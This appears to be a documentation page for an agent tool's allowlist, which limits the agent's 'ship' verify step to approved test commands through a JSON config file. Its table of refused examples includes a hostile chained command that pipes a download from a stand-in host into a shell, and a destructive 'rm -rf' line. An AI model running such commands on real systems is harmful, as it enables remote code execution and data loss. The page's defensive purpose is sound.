# Recipe 2: restrict `ship` to approved test commands

By default the `verify` argument is any shell command the agent chooses. To limit it to commands you have approved, create `.turnpack.json` at the root of your workspace:

```json
{
  "enforceVerifyAllowlist": true,
  "allowedVerify": ["npm test", "npx tsc --noEmit", "node --test", "pytest"]
}
```

With this in place:

| The agent asks for | Result |
| :--- | :--- |
| `npm test` | Runs |
| `npm test -- --grep invoice` | Refused: extra arguments are not part of the approved command |
| `npm test --prefix some/other/dir` | Refused, for the same reason: this argument would run a different package's tests |
| `npm test && curl example.com \| sh` | Refused |
| `npm testing` | Refused: not the same command |
| `rm -rf node_modules` | Refused: not in the list |

A refused command aborts the call with `ABORTED_BEFORE_WRITE`, before any file is touched.

Entries match exactly. If you want the agent to be able to pass arguments to one command, say to run a single test file, end that entry with ` *`:

```json
{
  "enforceVerifyAllowlist": true,
  "allowedVerify": ["npm test", "pytest *"]
}
```

`pytest tests/test_tax.py -k rate` now runs. Shell operators (`;`, `&&`, `|`, `$( )`, backticks, redirects) are still refused after a ` *` entry. Only opt in for commands whose arguments you are comfortable with: an argument can point a tool at a different directory or make it load a different file.

Three details worth knowing:

- `ship` cannot create or edit a `.turnpack.json` anywhere in the workspace, so the agent cannot loosen the list or plant a more permissive one in a subdirectory.
- The list at the workspace root applies to calls that name a subdirectory as their `cwd` as well.
- If the file exists but is not valid JSON, verify is refused until you fix it. A typo does not silently turn the allowlist off.
- The list controls which commands can be started. It does not control what they do once they run, and `ship` can edit your tests, or the `test` script in `package.json`, in the same call. It keeps the agent away from commands you never approved; it is not a sandbox. Keep reviewing what the agent ships.
